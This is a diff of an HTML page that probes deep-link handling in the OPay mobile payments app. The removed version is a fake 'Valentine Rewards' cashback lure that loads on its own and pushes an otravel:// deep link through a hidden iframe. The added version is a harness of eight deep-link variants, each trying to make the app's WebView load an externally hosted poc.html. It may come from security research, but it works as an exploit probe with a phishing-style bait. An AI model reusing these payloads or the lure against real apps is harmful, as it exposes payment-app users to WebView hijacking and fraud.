@@ -13,7 +13,7 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
             background: linear-gradient(135deg, #00c853 0%, #009624 100%);
             color: #fff;
             display: flex;
@@ -26,41 +26,35 @@
         .card {
             background: white;
             border-radius: 16px;
-            padding: 30px;
-            max-width: 360px;
+            padding: 24px;
+            max-width: 380px;
             width: 100%;
             text-align: center;
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
         }
 
-        .logo {
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
-
         h1 {
             color: #333;
-            font-size: 22px;
-            margin-bottom: 8px;
+            font-size: 20px;
+            margin-bottom: 6px;
         }
 
         .sub {
             color: #666;
-            font-size: 14px;
-            margin-bottom: 24px;
+            font-size: 13px;
+            margin-bottom: 16px;
         }
 
         .btn {
             display: block;
             width: 100%;
-            padding: 15px;
-            margin: 8px 0;
-            background: #00c853;
+            padding: 13px;
+            margin: 6px 0;
             color: white;
             text-decoration: none;
             border-radius: 10px;
             font-weight: bold;
-            font-size: 16px;
+            font-size: 14px;
             border: none;
             cursor: pointer;
             -webkit-tap-highlight-color: transparent;
@@ -68,27 +62,44 @@
 
         .btn:active {
             transform: scale(0.97);
-            background: #00a844;
         }
 
-        .btn.alt {
+        .g {
+            background: #00c853;
+        }
+
+        .b {
             background: #1a73e8;
         }
 
-        .btn.alt:active {
-            background: #1557b0;
+        .p {
+            background: #9c27b0;
         }
 
-        .small {
-            font-size: 11px;
-            color: #aaa;
-            margin-top: 20px;
+        .o {
+            background: #ff6d00;
+        }
+
+        .r {
+            background: #d32f2f;
+        }
+
+        .t {
+            background: #00838f;
+        }
+
+        .label {
+            font-size: 10px;
+            color: #999;
+            margin-top: 2px;
+            margin-bottom: 8px;
+            word-break: break-all;
         }
 
         .status {
             font-size: 12px;
             color: #999;
-            margin-top: 10px;
+            margin-top: 12px;
             min-height: 16px;
         }
     </style>
@@ -96,79 +107,68 @@
 
 <body>
     <div class="card">
-        <div class="logo">🎁</div>
-        <h1>OPay Valentine Rewards</h1>
-        <div class="sub">Tap below to claim your cashback reward in OPay!</div>
+        <div style="font-size:40px;margin-bottom:8px">🎁</div>
+        <h1>OPay Reward Claim</h1>
+        <div class="sub">Tap each button to test which opens WebView</div>
 
-        <a id="btnA" class="btn" href="#">🎉 Claim Reward Now</a>
-        <a id="btnB" class="btn alt" href="#">📱 Open in OPay</a>
+        <a id="b1" class="btn g" href="#">1️⃣ schemedispatcher + scheme= (encoded)</a>
+        <div id="l1" class="label"></div>
+
+        <a id="b2" class="btn b" href="#">2️⃣ schemedispatcher + scheme= (raw)</a>
+        <div id="l2" class="label"></div>
+
+        <a id="b3" class="btn p" href="#">3️⃣ webview?url= </a>
+        <div id="l3" class="label"></div>
+
+        <a id="b4" class="btn o" href="#">4️⃣ open?url=</a>
+        <div id="l4" class="label"></div>
+
+        <a id="b5" class="btn r" href="#">5️⃣ /web?url=</a>
+        <div id="l5" class="label"></div>
+
+        <a id="b6" class="btn t" href="#">6️⃣ schemedispatcher?url=</a>
+        <div id="l6" class="label"></div>
+
+        <a id="b7" class="btn g" href="#">7️⃣ Just the URL after scheme://</a>
+        <div id="l7" class="label"></div>
+
+        <a id="b8" class="btn b" href="#">8️⃣ host/path style</a>
+        <div id="l8" class="label"></div>
 
         <div class="status" id="status"></div>
-
-        <div class="small">Powered by OPay — Offer expires soon</div>
     </div>
 
     <script>
-        var PAYLOAD_BASE = "https://zugonwobi.github.io/opay-rewards/";
-        var CB = "?v=" + new Date().getTime();
+        var POC = "https://zugonwobi.github.io/opay-rewards/poc.html?v=" + Date.now();
 
-        var pocUrl = PAYLOAD_BASE + "poc.html" + CB;
+        // All the deep link format variations to test
+        var links = {
+            // 1. Original: otravel://schemedispatcher?scheme=<encoded_url>
+            b1: "otravel://schemedispatcher?scheme=" + encodeURIComponent(POC),
+            // 2. Same but URL NOT encoded
+            b2: "otravel://schemedispatcher?scheme=" + POC,
+            // 3. Common WebView pattern
+            b3: "otravel://webview?url=" + encodeURIComponent(POC),
+            // 4. Open pattern
+            b4: "otravel://open?url=" + encodeURIComponent(POC),
+            // 5. Web pattern
+            b5: "otravel://web?url=" + encodeURIComponent(POC),
+            // 6. schemedispatcher but with url= param instead of scheme=
+            b6: "otravel://schemedispatcher?url=" + encodeURIComponent(POC),
+            // 7. Direct URL as path: otravel://https://...
+            b7: "otravel://" + POC,
+            // 8. Host/path style: otravel://zugonwobi.github.io/opay-rewards/poc.html
+            b8: "otravel://zugonwobi.github.io/opay-rewards/poc.html?v=" + Date.now()
+        };
 
-        // Method A: otravel:// scheme (registered in CFBundleURLSchemes)
-        var deepA = "otravel://schemedispatcher?scheme=" + encodeURIComponent(pocUrl);
-
-        // Method B: opay:// scheme (try as fallback)
-        var deepB = "opay://webview?url=" + encodeURIComponent(pocUrl);
-
-        document.getElementById("btnA").href = deepA;
-        document.getElementById("btnB").href = deepB;
-
-        function setStatus(msg) {
-            document.getElementById("status").innerText = msg;
+        for (var id in links) {
+            var el = document.getElementById(id);
+            var lbl = document.getElementById("l" + id.replace("b", ""));
+            if (el) {
+                el.href = links[id];
+                if (lbl) lbl.innerText = links[id].substring(0, 120);
+            }
         }
-
-        // Try deep link via hidden iframe (less disruptive than location.href)
-        function tryDeepLink(url, label) {
-            setStatus("Opening " + label + "...");
-            var iframe = document.createElement("iframe");
-            iframe.style.display = "none";
-            iframe.src = url;
-            document.body.appendChild(iframe);
-            // Clean up after a few seconds
-            setTimeout(function () {
-                try { document.body.removeChild(iframe); } catch (e) { }
-            }, 3000);
-        }
-
-        document.getElementById("btnA").addEventListener("click", function (e) {
-            e.preventDefault();
-            setStatus("Opening OPay via otravel://...");
-            // Try iframe method first
-            tryDeepLink(deepA, "otravel");
-            // Also set location as backup after short delay
-            setTimeout(function () {
-                window.location.href = deepA;
-            }, 500);
-        });
-
-        document.getElementById("btnB").addEventListener("click", function (e) {
-            e.preventDefault();
-            setStatus("Opening OPay via opay://...");
-            tryDeepLink(deepB, "opay");
-            setTimeout(function () {
-                window.location.href = deepB;
-            }, 500);
-        });
-
-        // Auto-trigger on page load — try otravel:// automatically
-        setTimeout(function () {
-            setStatus("Redirecting to OPay app...");
-            tryDeepLink(deepA, "otravel");
-            // Fallback to location redirect
-            setTimeout(function () {
-                window.location.href = deepA;
-            }, 800);
-        }, 1000);
     </script>
 </body>
 
